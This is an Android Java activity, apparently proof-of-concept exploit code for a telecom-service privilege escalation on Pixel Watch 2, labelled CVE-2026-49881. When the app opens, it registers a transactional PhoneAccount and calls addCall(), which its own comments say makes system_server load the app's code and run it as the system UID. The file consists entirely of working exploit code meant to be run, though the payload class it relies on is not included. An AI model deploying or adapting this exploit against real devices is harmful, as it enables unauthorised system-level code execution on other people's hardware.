package com.poc.tlpe;

import android.app.Activity;
import android.content.ComponentName;
import android.net.Uri;
import android.os.Bundle;
import android.os.OutcomeReceiver;
import android.telecom.CallAttributes;
import android.telecom.CallControl;
import android.telecom.CallControlCallback;
import android.telecom.CallEndpoint;
import android.telecom.CallEventCallback;
import android.telecom.CallException;
import android.telecom.DisconnectCause;
import android.telecom.PhoneAccount;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.Button;
import android.view.Gravity;

import java.util.List;
import java.util.function.Consumer;

public class TlpeActivity extends Activity {
    private static final String TAG = "TLPE_EXPLOIT";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(16, 16, 16, 16);

        TextView title = new TextView(this);
        title.setText("CVE-2026-49881 TLPE PoC");
        title.setTextSize(18);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        Button triggerBtn = new Button(this);
        triggerBtn.setText("TRIGGER EXPLOIT");
        triggerBtn.setOnClickListener(v -> triggerExploit());
        layout.addView(triggerBtn);

        ScrollView scroll = new ScrollView(this);
        logView = new TextView(this);
        logView.setTextSize(10);
        logView.setPadding(8, 8, 8, 8);
        scroll.addView(logView);
        layout.addView(scroll, new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(layout);

        log("=== TLPE PoC for Pixel Watch 2 ===");
        log("UID: " + android.os.Process.myUid());
        log("PID: " + android.os.Process.myPid());
        log("Package: " + getPackageName());
        log("");
        log("This PoC exploits CVE-2026-49881:");
        log("InCallController.serviceClassExists() calls");
        log("createPackageContextAsUser with CONTEXT_INCLUDE_CODE");
        log("on untrusted packages, triggering our");
        log("AppComponentFactory.instantiateClassLoader()");
        log("in system_server (UID 1000).");
        log("");
        log("Auto-triggering exploit...");
        triggerExploit();
    }

    private void triggerExploit() {
        log("");
        log("[*] Starting exploit...");

        try {
            TelecomManager tm = (TelecomManager) getSystemService(TELECOM_SERVICE);
            if (tm == null) {
                log("[-] TelecomManager not available!");
                return;
            }

            PhoneAccountHandle handle = new PhoneAccountHandle(
                new ComponentName(getPackageName(), getPackageName() + ".DummyService"),
                "tlpe_poc"
            );

            log("[*] Registering PhoneAccount...");
            PhoneAccount account = PhoneAccount.builder(handle, "TLPE PoC")
                .setCapabilities(PhoneAccount.CAPABILITY_SUPPORTS_TRANSACTIONAL_OPERATIONS)
                .build();
            tm.registerPhoneAccount(account);
            log("[+] PhoneAccount registered");

            log("[*] Calling addCall() to trigger InCallController...");
            log("[*] This will cause serviceClassExists() to load our code in system_server");

            tm.addCall(
                new CallAttributes.Builder(
                    handle,
                    CallAttributes.DIRECTION_INCOMING,
                    "TLPE",
                    Uri.parse("tel:0")
                ).build(),
                Runnable::run,
                new OutcomeReceiver<CallControl, CallException>() {
                    @Override
                    public void onResult(CallControl result) {
                        runOnUiThread(() -> {
                            log("[+] addCall succeeded - CallControl received");
                            log("[+] Check logcat for system_server execution proof!");
                        });
                        try {
                            result.disconnect(
                                new DisconnectCause(DisconnectCause.LOCAL),
                                Runnable::run,
                                result2 -> {}
                            );
                        } catch (Exception e) {
                            // ignore cleanup errors
                        }
                    }
                    @Override
                    public void onError(CallException error) {
                        runOnUiThread(() -> {
                            log("[-] addCall error: " + error.getMessage());
                            log("[*] Error code: " + error.getCode());
                        });
                    }
                },
                new CallControlCallback() {
                    @Override public void onAnswer(int videoState, Consumer<Boolean> wasCompleted) {
                        wasCompleted.accept(true);
                    }
                    @Override public void onCallStreamingStarted(Consumer<Boolean> wasCompleted) {
                        wasCompleted.accept(true);
                    }
                    @Override public void onDisconnect(DisconnectCause cause, Consumer<Boolean> wasCompleted) {
                        wasCompleted.accept(true);
                    }
                    @Override public void onSetActive(Consumer<Boolean> wasCompleted) {
                        wasCompleted.accept(true);
                    }
                    @Override public void onSetInactive(Consumer<Boolean> wasCompleted) {
                        wasCompleted.accept(true);
                    }
                },
                new CallEventCallback() {
                    @Override public void onAvailableCallEndpointsChanged(List<CallEndpoint> endpoints) {}
                    @Override public void onCallEndpointChanged(CallEndpoint endpoint) {}
                    @Override public void onCallStreamingFailed(int reason) {}
                    @Override public void onEvent(String event, Bundle extras) {}
                    @Override public void onMuteStateChanged(boolean isMuted) {}
                }
            );

            log("[*] addCall() invoked - waiting for InCallController...");

        } catch (Exception e) {
            log("[-] Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            Log.e(TAG, "Exploit trigger failed", e);
        }
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        if (logView != null) {
            logView.append(msg + "\n");
        }
    }
}
